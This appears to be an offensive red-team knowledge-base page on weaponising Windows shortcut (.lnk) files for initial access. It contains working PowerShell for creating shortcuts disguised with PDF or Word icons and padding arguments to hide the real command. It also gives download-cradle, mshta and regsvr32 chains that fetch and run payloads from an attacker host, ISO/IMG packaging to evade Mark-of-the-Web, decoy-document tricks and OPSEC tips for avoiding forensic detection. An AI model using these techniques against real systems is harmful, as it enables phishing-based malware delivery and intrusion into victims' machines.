## LNK Weaponisation

Windows shortcut (.lnk) files as initial access payloads. LNK files can execute arbitrary commands when double-clicked, and their icon can be spoofed to look like a document or folder.

---

### Why LNK Files

- Execute commands on double-click without macro warnings
- Icon spoofing makes them look like PDFs, Word docs, folders
- Inside ISO/IMG/ZIP containers: **bypass Mark-of-the-Web (MotW)** — no SmartScreen warning
- Arguments are hidden from the user (only visible in Properties)
- Widely used in real-world campaigns (Qakbot, BumbleBee, IcedID)

---

### Mark-of-the-Web (MotW) Context

When a file is downloaded via a browser or email client, Windows applies an NTFS Alternate Data Stream (`Zone.Identifier`) marking it as "from the internet". Files with MotW trigger:
- SmartScreen warnings on execution
- Protected View in Office documents
- Macro auto-disable (Office 2022+)

**Container bypass:** Files inside ISO, IMG, and VHD containers do **not** inherit MotW when mounted and extracted. This is why LNK + ISO/IMG is the standard delivery chain.

```
Email/Web → HTML Smuggling → .iso download → user mounts → .lnk inside → executes payload
```

> [!Note]
> Microsoft has been progressively patching MotW propagation into containers (2022-2024). Test against the target's patch level.

---

### Creating LNK Files

#### PowerShell

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\Report.lnk")

# Target — the command to execute
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c start /b C:\Windows\Tasks\beacon.exe"

# Icon — spoof as PDF
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
# Or Word doc icon:
# $lnk.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"
# Or folder icon:
# $lnk.IconLocation = "%SystemRoot%\System32\shell32.dll,3"

# Window style — minimized (hides cmd window)
$lnk.WindowStyle = 7

# Working directory
$lnk.WorkingDirectory = "C:\Windows\Tasks"

$lnk.Save()
```

#### Icon Index Reference

| Icon | Source | Index |
|------|--------|-------|
| PDF | `msedge.exe` | 13 |
| Word doc | `WINWORD.EXE` | 0 |
| Excel | `EXCEL.EXE` | 0 |
| Folder | `shell32.dll` | 3 |
| Text file | `shell32.dll` | 70 |
| Setup/installer | `shell32.dll` | 15 |

---

### Argument Hiding

The `TargetPath` + `Arguments` fields have a 260-character limit visible in the Properties dialog. Pad with spaces to push the real command off-screen.

```powershell
# Pad arguments so the real command is hidden in Properties
$padding = " " * 260
$lnk.Arguments = "/c $padding & C:\Windows\Tasks\beacon.exe"
```

> Defenders checking Properties will see only spaces. The real command still executes.

---

### Common Payload Chains

#### LNK → Direct Execution

LNK runs a pre-staged payload (assumes payload is already on disk via ISO container).

```powershell
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c start update.exe"
$lnk.WorkingDirectory = "."    # relative to LNK location (inside mounted ISO)
```

#### LNK → PowerShell Download Cradle

```powershell
$lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments = "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/payload.ps1')"
$lnk.WindowStyle = 7
```

#### LNK → mshta (HTA delivery)

```powershell
$lnk.TargetPath = "C:\Windows\System32\mshta.exe"
$lnk.Arguments = "http://<attacker>/payload.hta"
$lnk.WindowStyle = 7
```

#### LNK → regsvr32 (COM scriptlet)

```powershell
$lnk.TargetPath = "C:\Windows\System32\regsvr32.exe"
$lnk.Arguments = "/s /n /u /i:http://<attacker>/payload.sct scrobj.dll"
```

---

### Packaging with ISO/IMG

Pair the LNK with a payload inside an ISO container:

```sh
# Linux — create ISO with mkisofs
mkisofs -o delivery.iso -J -r payload_dir/
# payload_dir/ contains: Report.lnk + beacon.exe (or DLL)

# Linux — create IMG
dd if=/dev/zero of=delivery.img bs=1M count=10
mkfs.fat delivery.img
sudo mount delivery.img /mnt
sudo cp payload_dir/* /mnt/
sudo umount /mnt

# PackMyPayload (automates ISO/IMG creation)
python3 PackMyPayload.py payload_dir/ delivery.iso --out-format iso
```

File naming strategy:
```
ISO contents:
├── Q3 Financial Report.lnk    ← spoofed with PDF icon
├── beacon.exe                  ← hidden file attribute set
└── (optional) decoy.pdf        ← real PDF opened by LNK after payload
```

```powershell
# Set hidden attribute on payload inside ISO build directory
attrib +h beacon.exe
```

---

### LNK + Decoy Document

Open a real document after payload execution so the user doesn't get suspicious.

```powershell
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c start beacon.exe & start report.pdf"
$lnk.WindowStyle = 7
```

---

> [!Note]
> **OPSEC:**
> - LNK metadata contains the machine name and MAC address of the creator — sanitise before delivery
> - `cmd.exe` as LNK target is suspicious — consider using `explorer.exe` or `conhost.exe` as alternatives
> - PowerShell cradles in LNK arguments are logged in Sysmon Event 1 (Process Create)
> - Argument padding is visible to forensic tools that read the raw LNK structure

---

> See also: [[2. Weaponisation & Delivery/HTML Smuggling]] (ISO/IMG delivery via browser), [[2. Weaponisation & Delivery/DLL Sideloading]]
